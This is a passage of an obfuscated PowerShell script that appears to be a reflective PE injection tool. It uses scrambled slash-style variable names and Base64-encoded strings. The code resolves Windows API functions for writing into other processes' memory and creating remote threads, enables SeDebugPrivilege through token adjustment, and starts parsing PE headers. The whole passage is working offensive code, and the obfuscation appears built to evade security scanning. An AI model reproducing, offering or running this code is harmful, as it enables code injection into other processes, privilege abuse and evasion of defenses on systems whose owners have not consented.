		${/=\_/==\_/\/\/=\/} = ___/\_/\/==\/\___/ kernel32.dll WriteProcessMemory
        ${__/\____/=\/===\/} = __/====\_/\___/\_/ @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        ${_/\__/\/=\/==\/\/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/=\_/==\_/\/\/=\/}, ${__/\____/=\/===\/})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value ${_/\__/\/=\/==\/\/}
		${/==\/=\/=\_/\/\/=} = ___/\_/\/==\/\___/ kernel32.dll ReadProcessMemory
        ${__/=====\____/\_/} = __/====\_/\___/\_/ @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        ${____/\__/=\/\/\/\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/==\/=\/=\_/\/\/=}, ${__/=====\____/\_/})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value ${____/\__/=\/\/\/\}
		${_/\/==\/====\_/==} = ___/\_/\/==\/\___/ kernel32.dll CreateRemoteThread
        ${______/====\__/==} = __/====\_/\___/\_/ @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        ${__/\/=\__/===\___} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/\/==\/====\_/==}, ${______/====\__/==})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value ${__/\/=\__/===\___}
		${_/\/\/\_/\/====\_} = ___/\_/\/==\/\___/ kernel32.dll GetExitCodeThread
        ${/===\_/=\/\/====\} = __/====\_/\___/\_/ @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        ${__/\___/\/====\/=} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/\/\/\_/\/====\_}, ${/===\_/=\/\/====\})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value ${__/\___/\/====\/=}
		${_____/\/=\/\_/\_/} = ___/\_/\/==\/\___/ Advapi32.dll OpenThreadToken
        ${/==\_____/\/\/==\} = __/====\_/\___/\_/ @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        ${_/\___/=====\_/\/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_____/\/=\/\_/\_/}, ${/==\_____/\/\/==\})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value ${_/\___/=====\_/\/}
		${_/==\/\_/===\_/==} = ___/\_/\/==\/\___/ kernel32.dll GetCurrentThread
        ${___/\___/\/=\___/} = __/====\_/\___/\_/ @() ([IntPtr])
        ${_____/====\___/\_} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/==\/\_/===\_/==}, ${___/\___/\/=\___/})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value ${_____/====\___/\_}
		${_/\_/\/=\/===\/\/} = ___/\_/\/==\/\___/ Advapi32.dll AdjustTokenPrivileges
        ${/==\_/===\/==\__/} = __/====\_/\___/\_/ @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        ${_/==\/==\___/\__/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/\_/\/=\/===\/\/}, ${/==\_/===\/==\__/})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value ${_/==\/==\___/\__/}
		${/====\/\/==\/====} = ___/\_/\/==\/\___/ Advapi32.dll LookupPrivilegeValueA
        ${_/\__/=====\_/===} = __/====\_/\___/\_/ @([String], [String], [IntPtr]) ([Bool])
        ${/=\/====\__/=\/==} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/====\/\/==\/====}, ${_/\__/=====\_/===})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value ${/=\/====\__/=\/==}
		${_/\/\__/==\/=====} = ___/\_/\/==\/\___/ Advapi32.dll ImpersonateSelf
        ${_/==\/==\/\_/\_/\} = __/====\_/\___/\_/ @([Int32]) ([Bool])
        ${_/=====\_/\/\/=\_} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/\/\__/==\/=====}, ${_/==\/==\/\_/\_/\})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value ${_/=====\_/\/\/=\_}
        if (([Environment]::OSVersion.Version -ge (New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 6,2))) {
		    ${______/===\____/=} = ___/\_/\/==\/\___/ NtDll.dll NtCreateThreadEx
            ${_/\_/\__/===\/==\} = __/====\_/\___/\_/ @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            ${__/=\/=\_/\/\____} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${______/===\____/=}, ${_/\_/\__/===\/==\})
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value ${__/=\/=\_/\/\____}
        }
		${__/\_/\/\__/==\_/} = ___/\_/\/==\/\___/ Kernel32.dll IsWow64Process
        ${/=\/\/\/\/\/\____} = __/====\_/\___/\_/ @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        ${__/\/=\/===\___/=} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${__/\_/\/\__/==\_/}, ${/=\/\/\/\/\/\____})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value ${__/\/=\/===\___/=}
		${__/\_/===\/=\/\/\} = ___/\_/\/==\/\___/ Kernel32.dll CreateThread
        ${_/=\/==\_/=\__/\_} = __/====\_/\___/\_/ @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        ${/=\/=\/\__/\_/\__} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${__/\_/===\/=\/\/\}, ${_/=\/==\_/=\__/\_})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value ${/=\/=\/\__/\_/\__}
		${_/==\__/\/==\_/\_} = ___/\_/\/==\/\___/ kernel32.dll VirtualFree
		${_/=\_/=\_/====\/\} = __/====\_/\___/\_/ @([IntPtr])
		${_/\/=====\_____/=} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/==\__/\/==\_/\_}, ${_/=\_/=\_/====\/\})
		$Win32Functions | Add-Member NoteProperty -Name LocalFree -Value ${_/\/=====\_____/=}
		return $Win32Functions
	}
	Function __/\__/=\/===\/===
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		${___/==\/\_/\__/\__},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${___/\/=\_/=\/==\/=}
		)
		[Byte[]]${/=\_/\___/=\/=\/=} = [BitConverter]::GetBytes(${___/==\/\_/\__/\__})
		[Byte[]]${/===\____/=====\_} = [BitConverter]::GetBytes(${___/\/=\_/=\/==\/=})
		[Byte[]]${_/=\_/\/\/\/==\/=} = [BitConverter]::GetBytes([UInt64]0)
		if (${/=\_/\___/=\/=\/=}.Count -eq ${/===\____/=====\_}.Count)
		{
			${/=\___/\/\______/} = 0
			for (${/===\_/==\_/\/===} = 0; ${/===\_/==\_/\/===} -lt ${/=\_/\___/=\/=\/=}.Count; ${/===\_/==\_/\/===}++)
			{
				${____/\_/=\/\_/\/=} = ${/=\_/\___/=\/=\/=}[${/===\_/==\_/\/===}] - ${/=\___/\/\______/}
				if (${____/\_/=\/\_/\/=} -lt ${/===\____/=====\_}[${/===\_/==\_/\/===}])
				{
					${____/\_/=\/\_/\/=} += 256
					${/=\___/\/\______/} = 1
				}
				else
				{
					${/=\___/\/\______/} = 0
				}
				[UInt16]${_/=\__/=\_/\/=\/\} = ${____/\_/=\/\_/\/=} - ${/===\____/=====\_}[${/===\_/==\_/\/===}]
				${_/=\_/\/\/\/==\/=}[${/===\_/==\_/\/===}] = ${_/=\__/=\_/\/=\/\} -band 0x00FF
			}
		}
		else
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIABzAHUAYgB0AHIAYQBjAHQAIABiAHkAdABlAGEAcgByAGEAeQBzACAAbwBmACAAZABpAGYAZgBlAHIAZQBuAHQAIABzAGkAegBlAHMA')))
		}
		return [BitConverter]::ToInt64(${_/=\_/\/\/\/==\/=}, 0)
	}
	Function _/=\/=\_/\/=\_/===
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		${___/==\/\_/\__/\__},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${___/\/=\_/=\/==\/=}
		)
		[Byte[]]${/=\_/\___/=\/=\/=} = [BitConverter]::GetBytes(${___/==\/\_/\__/\__})
		[Byte[]]${/===\____/=====\_} = [BitConverter]::GetBytes(${___/\/=\_/=\/==\/=})
		[Byte[]]${_/=\_/\/\/\/==\/=} = [BitConverter]::GetBytes([UInt64]0)
		if (${/=\_/\___/=\/=\/=}.Count -eq ${/===\____/=====\_}.Count)
		{
			${/=\___/\/\______/} = 0
			for (${/===\_/==\_/\/===} = 0; ${/===\_/==\_/\/===} -lt ${/=\_/\___/=\/=\/=}.Count; ${/===\_/==\_/\/===}++)
			{
				[UInt16]${_/=\__/=\_/\/=\/\} = ${/=\_/\___/=\/=\/=}[${/===\_/==\_/\/===}] + ${/===\____/=====\_}[${/===\_/==\_/\/===}] + ${/=\___/\/\______/}
				${_/=\_/\/\/\/==\/=}[${/===\_/==\_/\/===}] = ${_/=\__/=\_/\/=\/\} -band 0x00FF
				if ((${_/=\__/=\_/\/=\/\} -band 0xFF00) -eq 0x100)
				{
					${/=\___/\/\______/} = 1
				}
				else
				{
					${/=\___/\/\______/} = 0
				}
			}
		}
		else
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIABhAGQAZAAgAGIAeQB0AGUAYQByAHIAYQB5AHMAIABvAGYAIABkAGkAZgBmAGUAcgBlAG4AdAAgAHMAaQB6AGUAcwA=')))
		}
		return [BitConverter]::ToInt64(${_/=\_/\/\/\/==\/=}, 0)
	}
	Function _/=\__/==\/=\_/\__
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		${___/==\/\_/\__/\__},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${___/\/=\_/=\/==\/=}
		)
		[Byte[]]${/=\_/\___/=\/=\/=} = [BitConverter]::GetBytes(${___/==\/\_/\__/\__})
		[Byte[]]${/===\____/=====\_} = [BitConverter]::GetBytes(${___/\/=\_/=\/==\/=})
		if (${/=\_/\___/=\/=\/=}.Count -eq ${/===\____/=====\_}.Count)
		{
			for (${/===\_/==\_/\/===} = ${/=\_/\___/=\/=\/=}.Count-1; ${/===\_/==\_/\/===} -ge 0; ${/===\_/==\_/\/===}--)
			{
				if (${/=\_/\___/=\/=\/=}[${/===\_/==\_/\/===}] -gt ${/===\____/=====\_}[${/===\_/==\_/\/===}])
				{
					return $true
				}
				elseif (${/=\_/\___/=\/=\/=}[${/===\_/==\_/\/===}] -lt ${/===\____/=====\_}[${/===\_/==\_/\/===}])
				{
					return $false
				}
			}
		}
		else
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIABjAG8AbQBwAGEAcgBlACAAYgB5AHQAZQAgAGEAcgByAGEAeQBzACAAbwBmACAAZABpAGYAZgBlAHIAZQBuAHQAIABzAGkAegBlAA==')))
		}
		return $false
	}
	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		[Byte[]]${_/=====\_/\_/=\_/} = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64(${_/=====\_/\_/=\_/}, 0))
	}
	Function _/\____/=\/\/\/\__
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		${____/\/\_/\/\/\/\_},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${__/\/\_/\__/\___/=},
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		${___/==\/\/\_______},
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		${___/==\/===\/\_/=\}
		)
	    [IntPtr]${___/\_/\_____/\/=} = [IntPtr](_/=\/=\_/\/=\_/=== (${___/==\/\/\_______}) (${___/==\/===\/\_/=\}))
		${_/=\/==\_/\/\/=\/} = ${__/\/\_/\__/\___/=}.EndAddress
		if ((_/=\__/==\/=\_/\__ (${__/\/\_/\__/\___/=}.PEHandle) (${___/==\/\/\_______})) -eq $true)
		{
			Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHkAaQBuAGcAIAB0AG8AIAB3AHIAaQB0AGUAIAB0AG8AIABtAGUAbQBvAHIAeQAgAHMAbQBhAGwAbABlAHIAIAB0AGgAYQBuACAAYQBsAGwAbwBjAGEAdABlAGQAIABhAGQAZAByAGUAcwBzACAAcgBhAG4AZwBlAC4AIAAkAHsAXwBfAF8AXwAvAFwALwBcAF8ALwBcAC8AXAAvAFwALwBcAF8AfQA=')))
		}
		if ((_/=\__/==\/=\_/\__ (${___/\_/\_____/\/=}) (${_/=\/==\_/\/\/=\/})) -eq $true)
		{
			Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHkAaQBuAGcAIAB0AG8AIAB3AHIAaQB0AGUAIAB0AG8AIABtAGUAbQBvAHIAeQAgAGcAcgBlAGEAdABlAHIAIAB0AGgAYQBuACAAYQBsAGwAbwBjAGEAdABlAGQAIABhAGQAZAByAGUAcwBzACAAcgBhAG4AZwBlAC4AIAAkAHsAXwBfAF8AXwAvAFwALwBcAF8ALwBcAC8AXAAvAFwALwBcAF8AfQA=')))
		}
	}
	Function __/\_/====\/==\/\_
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			${____/\___/\/===\/=},
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			${___/==\/=\_/\_/\/\}
		)
		for (${_/\__/\/==\/=\/\_} = 0; ${_/\__/\/==\/=\/\_} -lt ${____/\___/\/===\/=}.Length; ${_/\__/\/==\/=\/\_}++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte(${___/==\/=\_/\_/\/\}, ${_/\__/\/==\/=\/\_}, ${____/\___/\/===\/=}[${_/\__/\/==\/=\/\_}])
		}
	}
	Function __/====\_/\___/\_/
	{
	    Param
	    (
	        [OutputType([Type])]
	        [Parameter( Position = 0)]
	        [Type[]]
	        ${___/\____/==\/==\_} = (New-Object Type[](0)),
	        [Parameter( Position = 1 )]
	        [Type]
	        ${__/\/======\_/\_/\} = [Void]
	    )
	    ${__/\__/\_/\/=\/=\} = [AppDomain]::CurrentDomain
	    ${_/\_/\/\_/\/=\/\/} = New-Object System.Reflection.AssemblyName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAbABlAGMAdABlAGQARABlAGwAZQBnAGEAdABlAA=='))))
	    ${__/\/===\/\__/\/=} = ${__/\__/\_/\/=\/=\}.DefineDynamicAssembly(${_/\_/\/\_/\/=\/\/}, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    ${_/\/\__/==\/\_/==} = ${__/\/===\/\__/\/=}.DefineDynamicModule($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAE0AZQBtAG8AcgB5AE0AbwBkAHUAbABlAA=='))), $false)
	    ${/===\/==\_/==\/\_} = ${_/\/\__/==\/\_/==}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB5AEQAZQBsAGUAZwBhAHQAZQBUAHkAcABlAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGEAcwBzACwAIABQAHUAYgBsAGkAYwAsACAAUwBlAGEAbABlAGQALAAgAEEAbgBzAGkAQwBsAGEAcwBzACwAIABBAHUAdABvAEMAbABhAHMAcwA='))), [System.MulticastDelegate])
	    ${___/\__/\_______/} = ${/===\/==\_/==\/\_}.DefineConstructor($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBUAFMAcABlAGMAaQBhAGwATgBhAG0AZQAsACAASABpAGQAZQBCAHkAUwBpAGcALAAgAFAAdQBiAGwAaQBjAA=='))), [System.Reflection.CallingConventions]::Standard, ${___/\____/==\/==\_})
	    ${___/\__/\_______/}.SetImplementationFlags($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AdABpAG0AZQAsACAATQBhAG4AYQBnAGUAZAA='))))
	    ${__/=\/\/\/\/==\_/} = ${/===\/==\_/==\/\_}.DefineMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAaQBkAGUAQgB5AFMAaQBnACwAIABOAGUAdwBTAGwAbwB0ACwAIABWAGkAcgB0AHUAYQBsAA=='))), ${__/\/======\_/\_/\}, ${___/\____/==\/==\_})
	    ${__/=\/\/\/\/==\_/}.SetImplementationFlags($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AdABpAG0AZQAsACAATQBhAG4AYQBnAGUAZAA='))))
	    echo ${/===\/==\_/==\/\_}.CreateType()
	}
	Function ___/\_/\/==\/\___/
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        ${__/===\/====\/==\/},
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        ${_/==\_/=\_______/=}
	    )
	    ${/==\/==\_/\/=\/=\} = [AppDomain]::CurrentDomain.GetAssemblies() |
	        ? { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBkAGwAbAA=')))) }
	    ${____________/\_/=} = ${/==\/==\_/\/=\/=\}.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQALgBXAGkAbgAzADIALgBVAG4AcwBhAGYAZQBOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzAA=='))))
	    ${_/==\/\__/=\___/\} = ${____________/\_/=}.GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQATQBvAGQAdQBsAGUASABhAG4AZABsAGUA'))))
	    ${/=\___/=\_/\_/==\} = ${____________/\_/=}.GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzAA=='))))
	    ${__/=\_____/\_____} = ${_/==\/\__/=\___/\}.Invoke($null, @(${__/===\/====\/==\/}))
	    ${__/\___/\__/\___/} = New-Object IntPtr
	    ${/=\/\/==\__/==\__} = New-Object System.Runtime.InteropServices.HandleRef(${__/\___/\__/\___/}, ${__/=\_____/\_____})
	    echo ${/=\___/=\_/\_/==\}.Invoke($null, @([System.Runtime.InteropServices.HandleRef]${/=\/\/==\__/==\__}, ${_/==\_/=\_______/=}))
	}
	Function Enable-SeDebugPrivilege
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		[IntPtr]${___/==\_/==\/=\/\} = $Win32Functions.GetCurrentThread.Invoke()
		if (${___/==\_/==\/=\/\} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABnAGUAdAAgAHQAaABlACAAaABhAG4AZABsAGUAIAB0AG8AIAB0AGgAZQAgAGMAdQByAHIAZQBuAHQAIAB0AGgAcgBlAGEAZAA=')))
		}
		[IntPtr]${__/\__/\___/=\/\_} = [IntPtr]::Zero
		[Bool]${/====\___/\/=\/==} = $Win32Functions.OpenThreadToken.Invoke(${___/==\_/==\/=\/\}, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]${__/\__/\___/=\/\_})
		if (${/====\___/\/=\/==} -eq $false)
		{
			${_/===\/=\/==\/==\} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if (${_/===\/=\/==\/==\} -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				${/====\___/\/=\/==} = $Win32Functions.ImpersonateSelf.Invoke(3)
				if (${/====\___/\/=\/==} -eq $false)
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABpAG0AcABlAHIAcwBvAG4AYQB0AGUAIABzAGUAbABmAA==')))
				}
				${/====\___/\/=\/==} = $Win32Functions.OpenThreadToken.Invoke(${___/==\_/==\/=\/\}, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]${__/\__/\___/=\/\_})
				if (${/====\___/\/=\/==} -eq $false)
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABPAHAAZQBuAFQAaAByAGUAYQBkAFQAbwBrAGUAbgAuAA==')))
				}
			}
			else
			{
				Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABPAHAAZQBuAFQAaAByAGUAYQBkAFQAbwBrAGUAbgAuACAARQByAHIAbwByACAAYwBvAGQAZQA6ACAAJAB7AF8ALwA9AD0APQBcAC8APQBcAC8APQA9AFwALwA9AD0AXAB9AA==')))
			}
		}
		[IntPtr]${__/\_/=\/\/\/\/==} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
		${/====\___/\/=\/==} = $Win32Functions.LookupPrivilegeValue.Invoke($null, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAEQAZQBiAHUAZwBQAHIAaQB2AGkAbABlAGcAZQA='))), ${__/\_/=\/\/\/\/==})
		if (${/====\___/\/=\/==} -eq $false)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGEAbABsACAATABvAG8AawB1AHAAUAByAGkAdgBpAGwAZQBnAGUAVgBhAGwAdQBlAA==')))
		}
		[UInt32]${____/\/\/\/\/====} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		[IntPtr]${/===\/\_______/\/} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${____/\/\/\/\/====})
		${_/\/====\_/===\__} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/===\/\_______/\/}, [Type]$Win32Types.TOKEN_PRIVILEGES)
		${_/\/====\_/===\__}.PrivilegeCount = 1
		${_/\/====\_/===\__}.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${__/\_/=\/\/\/\/==}, [Type]$Win32Types.LUID)
		${_/\/====\_/===\__}.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_/\/====\_/===\__}, ${/===\/\_______/\/}, $true)
		${/====\___/\/=\/==} = $Win32Functions.AdjustTokenPrivileges.Invoke(${__/\__/\___/=\/\_}, $false, ${/===\/\_______/\/}, ${____/\/\/\/\/====}, [IntPtr]::Zero, [IntPtr]::Zero)
		${_/===\/=\/==\/==\} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() 
		if ((${/====\___/\/=\/==} -eq $false) -or (${_/===\/=\/==\/==\} -ne 0))
		{
		}
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal(${/===\/\_______/\/})
	}
	Function _/=\/=\____/\____/
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		${_____/====\/\/==\_},
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		${___/==\/\/\_______},
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		${__/=\/=\_/=\__/\__} = [IntPtr]::Zero,
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$Win32Functions
		)
		[IntPtr]${_/====\_/=\_/\/=\} = [IntPtr]::Zero
		${__/\/===\/\__/===} = [Environment]::OSVersion.Version
		if ((${__/\/===\/\__/===} -ge (New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 6,0)) -and (${__/\/===\/\__/===} -lt (New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 6,2)))
		{
			Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFYAaQBzAHQAYQAvADcAIABkAGUAdABlAGMAdABlAGQALAAgAHUAcwBpAG4AZwAgAE4AdABDAHIAZQBhAHQAZQBUAGgAcgBlAGEAZABFAHgALgAgAEEAZABkAHIAZQBzAHMAIABvAGYAIAB0AGgAcgBlAGEAZAA6ACAAJAB7AF8AXwBfAC8APQA9AFwALwBcAC8AXABfAF8AXwBfAF8AXwBfAH0A')))
			${/=\_________/\_/\}= $Win32Functions.NtCreateThreadEx.Invoke([Ref]${_/====\_/=\_/\/=\}, 0x1FFFFF, [IntPtr]::Zero, ${_____/====\/\/==\_}, ${___/==\/\/\_______}, ${__/=\/=\_/=\__/\__}, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			${____/\_/===\__/\_} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if (${_/====\_/=\_/\/=\} -eq [IntPtr]::Zero)
			{
				Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAaQBuACAATgB0AEMAcgBlAGEAdABlAFQAaAByAGUAYQBkAEUAeAAuACAAUgBlAHQAdQByAG4AIAB2AGEAbAB1AGUAOgAgACQAewAvAD0AXABfAF8AXwBfAF8AXwBfAF8AXwAvAFwAXwAvAFwAfQAuACAATABhAHMAdABFAHIAcgBvAHIAOgAgACQAewBfAF8AXwBfAC8AXABfAC8APQA9AD0AXABfAF8ALwBcAF8AfQA=')))
			}
		}
		else
		{
			Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAAvADgAIABkAGUAdABlAGMAdABlAGQALAAgAHUAcwBpAG4AZwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkAC4AIABBAGQAZAByAGUAcwBzACAAbwBmACAAdABoAHIAZQBhAGQAOgAgACQAewBfAF8AXwAvAD0APQBcAC8AXAAvAFwAXwBfAF8AXwBfAF8AXwB9AA==')))
			${_/====\_/=\_/\/=\} = $Win32Functions.CreateRemoteThread.Invoke(${_____/====\/\/==\_}, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, ${___/==\/\/\_______}, ${__/=\/=\_/=\__/\__}, 0, [IntPtr]::Zero)
		}
		if (${_/====\_/=\_/\/=\} -eq [IntPtr]::Zero)
		{
			Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAYwByAGUAYQB0AGkAbgBnACAAcgBlAG0AbwB0AGUAIAB0AGgAcgBlAGEAZAAsACAAdABoAHIAZQBhAGQAIABoAGEAbgBkAGwAZQAgAGkAcwAgAG4AdQBsAGwA')))
		}
		return ${_/====\_/=\_/\/=\}
	}
	Function _/===\__/\_/\/=\/=
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		${__/\/\/\_/\/=\/=\_},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		${/==\__/\/==\__/\/} = New-Object System.Object
		${/==\_/=\/=\/=\__/} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${__/\/\/\_/\/=\/=\_}, [Type]$Win32Types.IMAGE_DOS_HEADER)
		[IntPtr]${_/\__/==\______/\} = [IntPtr](_/=\/=\_/\/=\_/=== ([Int64]${__/\/\/\_/\/=\/=\_}) ([Int64][UInt64]${/==\_/=\/=\/=\__/}.e_lfanew))
		${/==\__/\/==\__/\/} | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ${_/\__/==\______/\}
		${/==\/====\/\_/=\/} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/\__/==\______/\}, [Type]$Win32Types.IMAGE_NT_HEADERS64)
	    if (${/==\/====\/\_/=\/}.Signature -ne 0x00004550)
	    {
